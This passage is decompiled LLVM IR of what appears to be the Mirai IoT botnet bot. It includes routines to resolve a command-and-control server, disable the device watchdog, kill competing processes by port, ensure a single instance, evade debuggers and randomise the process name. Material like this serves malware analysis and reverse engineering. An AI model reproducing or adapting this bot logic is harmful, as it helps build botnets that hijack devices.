  br i1 %v2_d738, label %dec_label_pc_d648, label %dec_label_pc_d740

dec_label_pc_d740:                                ; preds = %dec_label_pc_d738.backedge, %dec_label_pc_d740.lr.ph
  %v0_d738 = phi i32 [ %v1_d738101, %dec_label_pc_d740.lr.ph ], [ %v1_d738, %dec_label_pc_d738.backedge ]
  %storemerge146.in = phi i32 [ 0, %dec_label_pc_d740.lr.ph ], [ %storemerge146, %dec_label_pc_d738.backedge ]
  %v1_d740 = phi i32 [ 0, %dec_label_pc_d740.lr.ph ], [ %v1_d740178, %dec_label_pc_d738.backedge ]
  %v2_d740 = add i32 %v1_d740, %v0_d740.pre
  %v3_d740 = inttoptr i32 %v2_d740 to i8*
  %v4_d740 = load i8, i8* %v3_d740, align 1
  %v6_d740 = zext i8 %v4_d740 to i32
  store i32 %v6_d740, i32* %r2.global-to-local, align 4
  %v2_d744 = add i32 %storemerge146.in, %v1_d744.pre
  %v3_d744 = inttoptr i32 %v2_d744 to i8*
  %v4_d744 = load i8, i8* %v3_d744, align 1
  %v6_d744 = zext i8 %v4_d744 to i32
  store i32 %v6_d744, i32* %r3.global-to-local, align 4
  %v9_d748 = icmp eq i8 %v4_d744, %v4_d740
  br i1 %v9_d748, label %dec_label_pc_d728, label %dec_label_pc_d754

dec_label_pc_d754:                                ; preds = %dec_label_pc_d740
  br label %dec_label_pc_d738.backedge

dec_label_pc_d75c:                                ; preds = %dec_label_pc_d774
  %v1_d75c = add i32 %v1_d778, 1
  store i32 %v1_d75c, i32* @lr, align 4
  %v9_d760 = icmp eq i32 %v3_d64c, %v1_d75c
  br i1 %v9_d760, label %dec_label_pc_d7d8, label %dec_label_pc_d76c.backedge

dec_label_pc_d76c.backedge:                       ; preds = %dec_label_pc_d75c, %dec_label_pc_d78c
  %v1_d778186 = phi i32 [ 0, %dec_label_pc_d78c ], [ %v1_d75c, %dec_label_pc_d75c ]
  %storemerge145 = add i32 %storemerge145.in, 1
  %v1_d76c = add i32 %v0_d76c, -1
  store i32 %v1_d76c, i32* %r1.global-to-local, align 4
  %v2_d76c = icmp eq i32 %v0_d76c, 0
  br i1 %v2_d76c, label %dec_label_pc_d664, label %dec_label_pc_d774

dec_label_pc_d774:                                ; preds = %dec_label_pc_d76c.backedge, %dec_label_pc_d774.lr.ph
  %v0_d76c = phi i32 [ %v1_d76c110, %dec_label_pc_d774.lr.ph ], [ %v1_d76c, %dec_label_pc_d76c.backedge ]
  %storemerge145.in = phi i32 [ 0, %dec_label_pc_d774.lr.ph ], [ %storemerge145, %dec_label_pc_d76c.backedge ]
  %v1_d778 = phi i32 [ 0, %dec_label_pc_d774.lr.ph ], [ %v1_d778186, %dec_label_pc_d76c.backedge ]
  store i32 %v3_d5a8, i32* %r3.global-to-local, align 4
  %v2_d778 = add i32 %v1_d778, %v3_d5a8
  %v3_d778 = inttoptr i32 %v2_d778 to i8*
  %v4_d778 = load i8, i8* %v3_d778, align 1
  %v6_d778 = zext i8 %v4_d778 to i32
  store i32 %v6_d778, i32* %r2.global-to-local, align 4
  %v2_d77c = add i32 %storemerge145.in, %v1_d77c.pre
  %v3_d77c = inttoptr i32 %v2_d77c to i8*
  %v4_d77c = load i8, i8* %v3_d77c, align 1
  %v6_d77c = zext i8 %v4_d77c to i32
  store i32 %v6_d77c, i32* @r3, align 4
  %v9_d780 = icmp eq i8 %v4_d77c, %v4_d778
  br i1 %v9_d780, label %dec_label_pc_d75c, label %dec_label_pc_d78c

dec_label_pc_d78c:                                ; preds = %dec_label_pc_d774
  br label %dec_label_pc_d76c.backedge

dec_label_pc_d794:                                ; preds = %dec_label_pc_d7ac
  %v1_d794 = add i32 %v1_d7b0, 1
  store i32 %v1_d794, i32* @lr, align 4
  %v9_d798 = icmp eq i32 %v3_d668, %v1_d794
  br i1 %v9_d798, label %dec_label_pc_d7d8, label %dec_label_pc_d7a4.backedge

dec_label_pc_d7a4.backedge:                       ; preds = %dec_label_pc_d794, %dec_label_pc_d7c4
  %v1_d7b0194 = phi i32 [ 0, %dec_label_pc_d7c4 ], [ %v1_d794, %dec_label_pc_d794 ]
  %storemerge = add i32 %storemerge.in, 1
  %v1_d7a4 = add i32 %v0_d7a4, -1
  store i32 %v1_d7a4, i32* %r1.global-to-local, align 4
  %v2_d7a4 = icmp eq i32 %v0_d7a4, 0
  br i1 %v2_d7a4, label %dec_label_pc_d680, label %dec_label_pc_d7ac

dec_label_pc_d7ac:                                ; preds = %dec_label_pc_d7a4.backedge, %dec_label_pc_d7ac.lr.ph
  %v0_d7a4 = phi i32 [ %v1_d7a4119, %dec_label_pc_d7ac.lr.ph ], [ %v1_d7a4, %dec_label_pc_d7a4.backedge ]
  %storemerge.in = phi i32 [ 0, %dec_label_pc_d7ac.lr.ph ], [ %storemerge, %dec_label_pc_d7a4.backedge ]
  %v1_d7b0 = phi i32 [ 0, %dec_label_pc_d7ac.lr.ph ], [ %v1_d7b0194, %dec_label_pc_d7a4.backedge ]
  store i32 %v3_d5bc, i32* %r3.global-to-local, align 4
  %v2_d7b0 = add i32 %v1_d7b0, %v3_d5bc
  %v3_d7b0 = inttoptr i32 %v2_d7b0 to i8*
  %v4_d7b0 = load i8, i8* %v3_d7b0, align 1
  %v6_d7b0 = zext i8 %v4_d7b0 to i32
  store i32 %v6_d7b0, i32* %r2.global-to-local, align 4
  %v2_d7b4 = add i32 %storemerge.in, %v1_d7b4.pre
  %v3_d7b4 = inttoptr i32 %v2_d7b4 to i8*
  %v4_d7b4 = load i8, i8* %v3_d7b4, align 1
  %v6_d7b4 = zext i8 %v4_d7b4 to i32
  store i32 %v6_d7b4, i32* @r3, align 4
  %v9_d7b8 = icmp eq i8 %v4_d7b4, %v4_d7b0
  br i1 %v9_d7b8, label %dec_label_pc_d794, label %dec_label_pc_d7c4

dec_label_pc_d7c4:                                ; preds = %dec_label_pc_d7ac
  br label %dec_label_pc_d7a4.backedge

dec_label_pc_d7cc:                                ; preds = %dec_label_pc_d6a0
  %v1_d7cc = add i32 %v1_d6a4, 1
  %v9_d7d0 = icmp eq i32 %v3_d684, %v1_d7cc
  br i1 %v9_d7d0, label %dec_label_pc_d7d8, label %dec_label_pc_d6b8

dec_label_pc_d7d8:                                ; preds = %dec_label_pc_d6c0, %dec_label_pc_d6f4, %dec_label_pc_d728, %dec_label_pc_d75c, %dec_label_pc_d794, %dec_label_pc_d7cc
  %v1_d7dc = call i32 @table_lock_val(i32 20)
  %v1_d7e4 = call i32 @table_lock_val(i32 21)
  %v1_d7ec = call i32 @table_lock_val(i32 22)
  %v1_d7f4 = call i32 @table_lock_val(i32 23)
  %v1_d7fc = call i32 @table_lock_val(i32 24)
  %v1_d804 = call i32 @table_lock_val(i32 36)
  %v1_d80c = call i32 @__GI___libc_close(i32 %v2_d520)
  %v0_d810 = load i32, i32* @r7, align 4
  store i32 9, i32* %r1.global-to-local, align 4
  %v2_d818 = call i32 @kill(i32 %v0_d810, i32 9)
  br label %dec_label_pc_d81c

dec_label_pc_d81c:                                ; preds = %dec_label_pc_d518, %dec_label_pc_d84c, %dec_label_pc_d7d8
  store i32 %v2_d3a4, i32* @r0, align 4
  store i32 64, i32* @r1, align 4
  %v0_d824 = call i32 @util_zero()
  store i32 %v2_d3f4, i32* @r0, align 4
  store i32 64, i32* @r1, align 4
  %v0_d834 = call i32 @util_zero()
  %v1_d83c = call i32 @sleep(i32 1)
  store i32 %v2_d37c, i32* @r4, align 4
  %v0_d844 = load i32, i32* @r7, align 4
  store i32 %v0_d844, i32* @r5, align 4
  br label %dec_label_pc_d2cc.backedge

dec_label_pc_d84c:                                ; preds = %dec_label_pc_d5dc.backedge, %dec_label_pc_d530
  %v1_d850 = call i32 @table_lock_val(i32 20)
  %v1_d858 = call i32 @table_lock_val(i32 21)
  %v1_d860 = call i32 @table_lock_val(i32 22)
  %v1_d868 = call i32 @table_lock_val(i32 23)
  %v1_d870 = call i32 @table_lock_val(i32 24)
  %v1_d878 = call i32 @table_lock_val(i32 36)
  %v1_d880 = call i32 @__GI___libc_close(i32 %v2_d520)
  br label %dec_label_pc_d81c

; uselistorder directives
  uselistorder i32 %v1_d7cc, { 1, 0 }
  uselistorder i32 %v1_d6b8, { 1, 0 }
  uselistorder i32 %v1_d6a4, { 1, 0 }
  uselistorder i32 %v0_d6b8, { 1, 0 }
  uselistorder i32 %v1_d5e8, { 1, 0 }
  uselistorder i32 %v2_d520, { 3, 2, 4, 1, 0 }
  uselistorder i1 %v7_d4fc, { 1, 0 }
  uselistorder i32 %v2_d4f8, { 1, 0 }
  uselistorder i32 %v2_d2d0, { 1, 0 }
  uselistorder i32 %stack_var_-8436.1.be, { 1, 0 }
  uselistorder i32 %v3_d450, { 1, 2, 0 }
  uselistorder i32 %v2_d360, { 1, 0 }
  uselistorder i32 %v1_d300, { 0, 1, 5, 4, 3, 2, 6, 8, 9, 7 }
  uselistorder i32 %v1_d2dc, { 2, 1, 0, 3 }
  uselistorder i32 %stack_var_-8436.0, { 1, 0 }
  uselistorder i32 %v2_d5d8, { 1, 0, 2 }
  uselistorder i32 %v2_d3f4, { 1, 0, 2 }
  uselistorder i32 %v3_d274, { 1, 0 }
  uselistorder i32 %v2_d240, { 2, 0, 1 }
  uselistorder i32 %v3_d1ec, { 1, 0 }
  uselistorder i32 %v1_d1dc, { 3, 2, 0, 4, 6, 5, 7, 8, 9, 1, 10, 11, 12 }
  uselistorder i32 %v3_d15c, { 1, 2, 0 }
  uselistorder i32 %v3_d110, { 1, 2, 0 }
  uselistorder i32 %v3_d0c4, { 1, 2, 0 }
  uselistorder i32 %v3_d070, { 1, 2, 0 }
  uselistorder i32 %v3_d01c, { 1, 2, 0 }
  uselistorder i32 %v3_cfc8, { 1, 2, 0 }
  uselistorder i32 %storemerge212, { 1, 0 }
  uselistorder i32 %v0_cf54, { 1, 2, 3, 0 }
  uselistorder i32* %stack_var_-80, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %stack_var_-64, { 1, 0, 2 }
  uselistorder i32* %stack_var_-44, { 1, 0, 2 }
  uselistorder i32* %stack_var_-48, { 1, 0, 2 }
  uselistorder i32* %stack_var_-52, { 1, 0, 2 }
  uselistorder i32* %stack_var_-56, { 1, 0, 2 }
  uselistorder i32* %stack_var_-60, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 6, 7, 8, 9, 10, 12, 11, 4, 3, 2, 1, 0, 13, 5, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 28, 27, 29, 30, 31, 33, 32, 34, 35, 36, 37, 38, 39, 40, 41, 43, 42, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66 }
  uselistorder i32 (i32*)* @__GI_readdir, { 4, 3, 0, 5, 6, 7, 2, 8, 1 }
  uselistorder i32 (i32)* @__GI_opendir, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @readlink, { 3, 2, 1, 0 }
  uselistorder i32 4095, { 1, 0, 2, 3 }
  uselistorder i32* @global_var_24f7c.79, { 1, 0, 2, 3 }
  uselistorder i32* @global_var_24f80.71, { 0, 2, 1 }
  uselistorder label %dec_label_pc_d81c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_d7d8, { 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_d7a4.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_d76c.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_d738.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_d704.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_d6d0.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_d6b8, { 1, 0 }
  uselistorder label %dec_label_pc_d5f4, { 1, 0 }
  uselistorder label %dec_label_pc_d518, { 1, 0 }
  uselistorder label %.thread12, { 1, 0 }
  uselistorder label %dec_label_pc_d2cc.backedge, { 4, 3, 0, 1, 5, 2 }
  uselistorder label %dec_label_pc_d4ac, { 1, 0 }
  uselistorder label %dec_label_pc_d2dc, { 1, 0 }
  uselistorder label %dec_label_pc_d2dc.preheader, { 1, 0 }
  uselistorder label %.thread9, { 1, 0 }
  uselistorder label %dec_label_pc_d188, { 1, 0 }
  uselistorder label %dec_label_pc_d13c, { 1, 0 }
  uselistorder label %dec_label_pc_d0f0, { 1, 0 }
  uselistorder label %dec_label_pc_d09c, { 1, 0 }
  uselistorder label %dec_label_pc_d048, { 1, 0 }
  uselistorder label %dec_label_pc_cff4, { 1, 0 }
}

define i32 @anti_gdb_entry(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_da10.84 to i32), i32* @global_var_222ec.86, align 4
  ret i32 %arg1
}

define i32 @ensure_single_instance(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v9_d8b0 = load i32, i32* @r6, align 4
  %v12_d8b0 = load i32, i32* @r7, align 4
  %v15_d8b0 = load i32, i32* @r8, align 4
  store i32 1, i32* @r4, align 4
  store i32 1, i32* %stack_var_-28, align 4
  %v3_d8cc = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 ptrtoint (i32* @global_var_222e4.88 to i32), i32* @r6, align 4
  %v7_d8d4 = icmp eq i32 %v3_d8cc, -1
  store i32 %v3_d8cc, i32* @global_var_222e4.88, align 4
  br i1 %v7_d8d4, label %dec_label_pc_d98c, label %dec_label_pc_d8e0

dec_label_pc_d8e0:                                ; preds = %entry
  %v2_d8e0 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_d8e0, i32* @r3, align 4
  %v0_d8e4 = load i32, i32* @r4, align 4
  store i32 4, i32* @r5, align 4
  %v5_d8f4 = call i32 @__GI_setsockopt(i32 %v3_d8cc, i32 %v0_d8e4, i32 2, i32 %v2_d8e0, i32 4)
  %v2_d8f8 = load i32, i32* @global_var_222e4.88, align 4
  store i32 %v2_d8f8, i32* @r4, align 4
  store i32 0, i32* @r2, align 4
  %v2_d908 = call i32 @__libc_fcntl(i32 %v2_d8f8, i32 3)
  %v0_d90c = load i32, i32* @r5, align 4
  %v1_d910 = or i32 %v2_d908, 2048
  store i32 %v1_d910, i32* @r2, align 4
  %v0_d914 = load i32, i32* @r4, align 4
  %v2_d918 = call i32 @__libc_fcntl(i32 %v0_d914, i32 %v0_d90c)
  store i32 ptrtoint (i8** @global_var_222f0.90 to i32), i32* @r8, align 4
  %v2_d920 = load i8, i8* bitcast (i8** @global_var_222f0.90 to i8*), align 4
  %v2_d924 = icmp eq i8 %v2_d920, 0
  br i1 %v2_d924, label %.thread2, label %bb

.thread2:                                         ; preds = %dec_label_pc_d8e0
  br label %bb20

bb:                                               ; preds = %dec_label_pc_d8e0
  br label %bb20

bb20:                                             ; preds = %.thread2, %bb
  %v0_d948 = call i32 @__GI___errno_location()
  store i32 0, i32* @r7, align 4
  %v2_d950 = inttoptr i32 %v0_d948 to i32*
  store i32 0, i32* %v2_d950, align 4
  %v2_d954 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_d954, i32* @r5, align 4
  store i32 %v0_d948, i32* %r4.global-to-local, align 4
  %v2_d964 = load i32, i32* @global_var_222e4.88, align 4
  store i32 2, i32* %stack_var_-44, align 4
  %v3_d970 = call i32 @bind(i32 %v2_d964, i32 %v2_d954, i32 16)
  %v7_d974 = icmp eq i32 %v3_d970, -1
  br i1 %v7_d974, label %dec_label_pc_d998, label %dec_label_pc_d97c

dec_label_pc_d97c:                                ; preds = %bb20
  %v2_d984 = load i32, i32* @global_var_222e4.88, align 4
  %v2_d988 = call i32 @listen(i32 %v2_d984, i32 1)
  br label %dec_label_pc_d98c

dec_label_pc_d98c:                                ; preds = %entry, %dec_label_pc_d9a4, %dec_label_pc_d97c
  %v1_d994 = phi i32 [ %v3_d8cc, %entry ], [ %v1_d9e8, %dec_label_pc_d9a4 ], [ %v2_d988, %dec_label_pc_d97c ]
  store i32 %v9_d8b0, i32* @r6, align 4
  store i32 %v12_d8b0, i32* @r7, align 4
  store i32 %v15_d8b0, i32* @r8, align 4
  ret i32 %v1_d994

dec_label_pc_d998:                                ; preds = %bb20
  %v0_d998 = load i32, i32* %r4.global-to-local, align 4
  %v1_d998 = inttoptr i32 %v0_d998 to i32*
  %v2_d998 = load i32, i32* %v1_d998, align 4
  %v7_d99c = icmp eq i32 %v2_d998, 99
  br i1 %v7_d99c, label %dec_label_pc_d9f0, label %dec_label_pc_d9a4

dec_label_pc_d9a4:                                ; preds = %dec_label_pc_d9f0, %bb21, %dec_label_pc_d998
  store i32 11194, i32* @r4, align 4
  %v2_d9bc = load i32, i32* @global_var_222e4.88, align 4
  store i32 2, i32* %stack_var_-44, align 4
  %v3_d9cc = call i32 @__libc_connect(i32 %v2_d9bc, i32 %v2_d954, i32 16)
  %v1_d9d4 = call i32 @sleep(i32 5)
  %v2_d9d8 = load i32, i32* @global_var_222e4.88, align 4
  %v1_d9dc = call i32 @__GI___libc_close(i32 %v2_d9d8)
  %v0_d9e0 = load i32, i32* @r4, align 4
  %v1_d9e4 = call i32 @killer_kill_by_port(i32 %v0_d9e0)
  %v1_d9e8 = call i32 @ensure_single_instance(i32 %v1_d9e4)
  br label %dec_label_pc_d98c

dec_label_pc_d9f0:                                ; preds = %dec_label_pc_d998
  %v2_d9f0 = load i8, i8* bitcast (i8** @global_var_222f0.90 to i8*), align 4
  %v3_d9f0 = zext i8 %v2_d9f0 to i32
  %v1_d9f4 = load i32, i32* @r7, align 4
  %v9_d9f4 = icmp eq i32 %v3_d9f0, %v1_d9f4
  br i1 %v9_d9f4, label %dec_label_pc_d9a4, label %bb21

bb21:                                             ; preds = %dec_label_pc_d9f0
  %v2_d9fc = trunc i32 %v1_d9f4 to i8
  store i8 %v2_d9fc, i8* bitcast (i8** @global_var_222f0.90 to i8*), align 4
  br label %dec_label_pc_d9a4

; uselistorder directives
  uselistorder i32 %v2_d954, { 1, 0, 2 }
  uselistorder i32 %v3_d8cc, { 1, 2, 3, 0 }
  uselistorder i32* %stack_var_-28, { 1, 0 }
  uselistorder i32 (i32)* @killer_kill_by_port, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32)* @listen, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @bind, { 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8* bitcast (i8** @global_var_222f0.90 to i8*), { 0, 2, 1 }
  uselistorder i8** @global_var_222f0.90, { 1, 0 }
  uselistorder label %dec_label_pc_d9a4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_d98c, { 1, 2, 0 }
  uselistorder label %bb20, { 1, 0 }
}

define i32 @resolve_cnc_addr(i32 %arg1) local_unnamed_addr {
entry:
  %v1_da18 = call i32 @table_unlock_val(i32 2)
  %v3_da24 = call i32 @table_retrieve_val(i32 2, i32* null)
  %v1_da28 = call i32 @resolv_lookup(i32 %v3_da24)
  store i32 %v1_da28, i32* @r6, align 4
  %v1_da34 = call i32 @table_lock_val(i32 2)
  %v0_da38 = load i32, i32* @r6, align 4
  %v2_da38 = icmp eq i32 %v0_da38, 0
  br i1 %v2_da38, label %dec_label_pc_da88, label %dec_label_pc_da40

dec_label_pc_da40:                                ; preds = %entry
  %v1_da40 = add i32 %v0_da38, 4
  %v2_da40 = inttoptr i32 %v1_da40 to i32*
  %v3_da40 = load i32, i32* %v2_da40, align 4
  store i32 %v3_da40, i32* @r4, align 4
  %v0_da44 = call i32 @rand_next()
  %v0_da48 = load i32, i32* @r6, align 4
  %v1_da48 = inttoptr i32 %v0_da48 to i8*
  %v2_da48 = load i8, i8* %v1_da48, align 1
  %v3_da48 = zext i8 %v2_da48 to i32
  %v3_da4c = urem i32 %v0_da44, %v3_da48
  store i32 ptrtoint (i16** @global_var_24f84.93 to i32), i32* @r5, align 4
  %v0_da54 = load i32, i32* @r4, align 4
  %v4_da54 = mul nuw nsw i32 %v3_da4c, 4
  %v5_da54 = add i32 %v0_da54, %v4_da54
  %v6_da54 = inttoptr i32 %v5_da54 to i32*
  %v7_da54 = load i32, i32* %v6_da54, align 4
  store i32 %v7_da54, i32* @global_var_24f88.94, align 4
  %v1_da60 = call i32 @resolv_entries_free(i32 %v0_da48)
  %v1_da68 = call i32 @table_unlock_val(i32 1)
  %v3_da74 = call i32 @table_retrieve_val(i32 1, i32* null)
  %v4_da74 = inttoptr i32 %v3_da74 to i16*
  %v3_da78 = load i16, i16* %v4_da74, align 2
  store i16 %v3_da78, i16* bitcast (i32* @global_var_24f86.95 to i16*), align 4
  %v1_da84 = call i32 @table_lock_val(i32 1)
  br label %dec_label_pc_da88

dec_label_pc_da88:                                ; preds = %entry, %dec_label_pc_da40
  %v1_da8c = phi i32 [ %v1_da34, %entry ], [ %v1_da84, %dec_label_pc_da40 ]
  ret i32 %v1_da8c

; uselistorder directives
  uselistorder label %dec_label_pc_da88, { 1, 0 }
}

define i32 @watchdog_maintain(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %v3_da94 = load i32, i32* @r4, align 4
  %v6_da94 = load i32, i32* @r5, align 4
  %v0_da9c = call i32 @__libc_fork()
  %v7_daa0 = icmp eq i32 %v0_da9c, -1
  %. = zext i1 %v7_daa0 to i32
  %tmp11 = icmp slt i32 %v0_da9c, 1
  %storemerge4 = select i1 %tmp11, i32 %., i32 1
  store i32 %storemerge4, i32* @r5, align 4
  %v2_dabc = icmp eq i32 %storemerge4, 0
  store i32 %v0_da9c, i32* @global_var_22464.97, align 4
  br i1 %v2_dabc, label %dec_label_pc_dad4, label %dec_label_pc_dac8

dec_label_pc_dac8:                                ; preds = %entry
  store i32 %v3_da94, i32* @r4, align 4
  store i32 %v6_da94, i32* @r5, align 4
  ret i32 %v0_da9c

dec_label_pc_dad4:                                ; preds = %entry
  store i32 1, i32* %stack_var_-20, align 4
  %v1_dae0 = call i32 @table_unlock_val(i32 28)
  %v1_dae8 = call i32 @table_unlock_val(i32 29)
  %v0_daec = load i32, i32* @r5, align 4
  %v2_daf4 = inttoptr i32 %v0_daec to i32*
  %v3_daf4 = call i32 @table_retrieve_val(i32 28, i32* %v2_daf4)
  %v2_dafc = call i32 @__libc_open(i32 %v3_daf4, i32 2)
  %v7_db00 = icmp eq i32 %v2_dafc, -1
  store i32 %v2_dafc, i32* @r4, align 4
  br i1 %v7_db00, label %dec_label_pc_db48, label %dec_label_pc_db0c

dec_label_pc_db0c:                                ; preds = %dec_label_pc_db48, %dec_label_pc_dad4
  %v0_db18 = phi i32 [ %v2_db58, %dec_label_pc_db48 ], [ %v2_dafc, %dec_label_pc_dad4 ]
  %v2_db1c = ptrtoint i32* %stack_var_-20 to i32
  %v3_db20 = call i32 @ioctl(i32 %v0_db18, i32 -2147199228, i32 %v2_db1c)
  br label %dec_label_pc_db24

dec_label_pc_db24:                                ; preds = %dec_label_pc_db24, %dec_label_pc_db0c
  %v0_db30 = load i32, i32* @r4, align 4
  %v3_db38 = call i32 @ioctl(i32 %v0_db30, i32 -2147199227, i32 0)
  %v1_db40 = call i32 @sleep(i32 10)
  br label %dec_label_pc_db24

dec_label_pc_db48:                                ; preds = %dec_label_pc_dad4
  %v0_db48 = load i32, i32* @r5, align 4
  %v2_db50 = inttoptr i32 %v0_db48 to i32*
  %v3_db50 = call i32 @table_retrieve_val(i32 29, i32* %v2_db50)
  %v2_db58 = call i32 @__libc_open(i32 %v3_db50, i32 2)
  %v3_db5c = icmp eq i32 %v2_db58, -1
  store i32 %v2_db58, i32* @r4, align 4
  br i1 %v3_db5c, label %dec_label_pc_db68, label %dec_label_pc_db0c

dec_label_pc_db68:                                ; preds = %dec_label_pc_db48
  %v1_db6c = call i32 @table_lock_val(i32 28)
  %v1_db74 = call i32 @table_lock_val(i32 29)
  %v0_db78 = load i32, i32* @r5, align 4
  %v1_db7c = call i32 @__GI_exit(i32 %v0_db78)
  %v0_db80 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_db80, label %bb14, label %bb15

bb14:                                             ; preds = %dec_label_pc_db68
  br label %bb15

bb15:                                             ; preds = %dec_label_pc_db68, %bb14
  ret i32 %v1_db7c

; uselistorder directives
  uselistorder i32 %v2_db58, { 1, 2, 0 }
  uselistorder i32 %v2_dafc, { 1, 2, 0 }
  uselistorder i32 %storemerge4, { 1, 0 }
  uselistorder i32 %v0_da9c, { 3, 1, 2, 0 }
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder label %bb15, { 1, 0 }
}

define i32 @main(i32 %argc, i8** %argv) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8** %argv to i32
  %stack_var_-1432 = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-42 = alloca i8*, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-408 = alloca i32, align 4
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %v2_db94 = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v2_db94, i32* @r4, align 4
  store i32 0, i32* @r5, align 4
  store i32 %argc, i32* @r6, align 4
  store i32 %tmp, i32* @r8, align 4
  store i32 0, i32* %stack_var_-48, align 4
  %v2_dbac = call i32 @sigemptyset(i32* nonnull %stack_var_-64)
  %v2_dbb8 = call i32 @__GI_sigaddset(i32 %v2_db94, i32 2)
  %v0_dbbc = load i32, i32* @r5, align 4
  store i32 %v0_dbbc, i32* %r2.global-to-local, align 4
  %v4_dbc8 = call i32 @__GI_sigprocmask(i32 %v0_dbbc, i32* nonnull %stack_var_-64, i32 %v0_dbbc)
  %v2_dbd4 = call i32 @bsd_signal(i32 17, i32 1)
  %v2_dbe0 = call i32 @bsd_signal(i32 5, i32 55448)
  %v0_dbe4 = call i32 @util_local_addr()
  store i32 ptrtoint (i16** @global_var_24f84.93 to i32), i32* %r2.global-to-local, align 4
  store i32 1494907824, i32* @global_var_24f88.94, align 4
  store i32 2, i32* %ip.global-to-local, align 4
  store i32 5888, i32* %r3.global-to-local, align 4
  store i32 %v0_dbe4, i32* @global_var_24f78.59, align 4
  store i16 5888, i16* bitcast (i32* @global_var_24f86.95 to i16*), align 4
  store i16 2, i16* bitcast (i16** @global_var_24f84.93 to i16*), align 4
  %v6_dc0c = call i32 @table_init(i32 %v0_dbe4, i32 ptrtoint (i32* @global_var_24f78.59 to i32), i32 ptrtoint (i16** @global_var_24f84.93 to i32), i32 5888)
  store i32 ptrtoint (i32* @global_var_da10.84 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_222ec.86 to i32), i32* @lr, align 4
  %v2_dc18 = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_dc18, i32* @sb, align 4
  store i32 ptrtoint (i32* @global_var_da10.84 to i32), i32* @global_var_222ec.86, align 4
  %v1_dc20 = call i32 @ensure_single_instance(i32 %v6_dc0c)
  %v1_dc24 = call i32 @rand_init(i32 %v1_dc20)
  store i32 %v2_dc18, i32* @r0, align 4
  store i32 32, i32* @r1, align 4
  %v0_dc30 = call i32 @util_zero()
  %v0_dc34 = load i32, i32* @r6, align 4
  %v7_dc34 = icmp eq i32 %v0_dc34, 2
  br i1 %v7_dc34, label %dec_label_pc_dd64, label %dec_label_pc_dc3c

dec_label_pc_dc3c:                                ; preds = %dec_label_pc_dd64, %entry, %dec_label_pc_dd74
  %v0_dc3c = call i32 @rand_next()
  store i32 %v0_dc3c, i32* @r6, align 4
  %v0_dc44 = load i32, i32* @r8, align 4
  %v1_dc44 = inttoptr i32 %v0_dc44 to i32*
  %v2_dc44 = load i32, i32* %v1_dc44, align 4
  %v1_dc48 = inttoptr i32 %v2_dc44 to i8*
  %v2_dc48 = call i32 @util_strlen(i8* %v1_dc48)
  %v0_dc50 = load i32, i32* @r8, align 4
  %v1_dc50 = inttoptr i32 %v0_dc50 to i32*
  %v2_dc50 = load i32, i32* %v1_dc50, align 4
  %v1_dc54 = inttoptr i32 %v2_dc50 to i8*
  %v2_dc54 = call i32 @util_strlen(i8* %v1_dc54)
  %v1_dc58 = sub i32 20, %v2_dc48
  %v0_dc60 = load i32, i32* @r6, align 4
  %v3_dc64 = urem i32 %v0_dc60, %v1_dc58
  %v2_dc68 = ptrtoint i32* %stack_var_-120 to i32
  store i32 %v2_dc68, i32* @r5, align 4
  %v2_dc6c = add i32 %v3_dc64, %v2_dc54
  store i32 %v2_dc6c, i32* @r4, align 4
  %v2_dc78 = call i32 @rand_alpha_str(i32 %v2_dc68, i32 %v2_dc6c)
  %v2_dc7c = ptrtoint i32* %stack_var_-40 to i32
  %v1_dc80 = load i32, i32* @r4, align 4
  %v2_dc80 = add i32 %v1_dc80, %v2_dc7c
  store i32 %v2_dc80, i32* %r3.global-to-local, align 4
  store i32 0, i32* @sl, align 4
  %v0_dc8c = load i32, i32* @r8, align 4
  %v1_dc8c = inttoptr i32 %v0_dc8c to i32*
  %v2_dc8c = load i32, i32* %v1_dc8c, align 4
  store i32 %v2_dc8c, i32* @r0, align 4
  %v3_dc90 = add i32 %v2_dc80, -80
  %v4_dc90 = inttoptr i32 %v3_dc90 to i8*
  store i8 0, i8* %v4_dc90, align 1
  %v2_dc94 = inttoptr i32 %v2_dc8c to i8*
